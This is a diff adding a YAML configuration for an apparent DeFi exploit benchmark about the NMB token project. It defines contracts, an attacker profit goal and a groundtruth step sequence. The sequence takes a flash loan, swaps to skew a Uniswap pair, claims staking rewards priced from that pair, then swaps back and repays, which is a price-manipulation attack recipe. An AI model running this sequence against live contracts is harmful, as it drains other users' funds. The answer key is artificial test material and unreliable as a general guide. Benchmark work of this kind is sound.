@@ -1,0 +1,88 @@
+# Information for benchmarks building.
+project_name: "NMB"
+
+ctrt_name2cls:
+  - ["nbu", "NBU"]
+  - ["nimb", "NIMB"]
+  - ["Gnimb", "GNIMB"]
+  - ["pairnbunimb", "UniswapV2Pair"]
+  - ["pairnbuGnimb", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+  - ["Gnimbstaking", "GNIMBStaking"]
+
+ctrt_name2deploy:
+  - ["nbu", "new NBU()"]
+  - ["nimb", "new NIMB()"]
+  - ["Gnimb", "new GNIMB()"]
+  - ["pairnbunimb", ""]
+  - ["pairnbuGnimb", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  - [
+      "Gnimbstaking",
+      "new GNIMBStaking(
+      address(nbu),
+      address(nimb),
+      address(Gnimb), address(router), 50)",
+    ]
+
+extra_actions:
+  - "function transaction_Gnimbstaking_Gnimb(uint256 amount) internal {
+    Gnimbstaking.getReward();
+    }"
+
+extra_deployments:
+  - "Gnimb.transfer(address(Gnimbstaking), 1500000 ether);"
+  - "Gnimb.transfer(attacker, 150000 ether);"
+  - "vm.stopPrank();"
+  - "Gnimb.approve(address(Gnimbstaking), type(uint256).max);"
+  - "Gnimbstaking.stake(Gnimb.balanceOf(attacker));"
+  - "vm.warp(blockTimestamp + 8 * 24 * 60 * 60);"
+  - "vm.startPrank(owner);"
+extra_constraints: []
+
+attack_goal: "nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker"
+
+groundtruth:
+  - ["borrow", "nimb", "100000000e18"]
+  - ["swap", "pairnbunimb", "nimb", "nbu", "nimb.balanceOf(attacker)"]
+  - ["transaction", "Gnimbstaking", "Gnimb", "0"]
+  - ["swap", "pairnbunimb", "nbu", "nimb", "nbu.balanceOf(attacker)"]
+  - ["swap", "pairnbuGnimb", "Gnimb", "nbu", "Gnimb.balanceOf(attacker)"]
+  - ["swap", "pairnbunimb", "nbu", "nimb", "3 ether"]
+  - ["payback", "nimb", "100000000e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "nbu":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "nimb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "Gnimb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "pairnbunimb":
+    is_swappair: true
+    uniswap_order: ["nbu", "nimb"]
+    support_swaps:
+      "nbu": ["nimb", "nbu"]
+      "nimb": ["nimb", "nbu"]
+    is_oracle: true
+  "pairnbuGnimb":
+    is_swappair: true
+    uniswap_order: ["Gnimb", "nbu"]
+    support_swaps:
+      "nbu": ["Gnimb", "nbu"]
+      "Gnimb": ["Gnimb", "nbu"]
+    is_oracle: true
+  "Gnimbstaking":
+    is_defientry: true
+    hacked_assets: ["Gnimb"]
+
+pattern: "BuySell Manipulation"
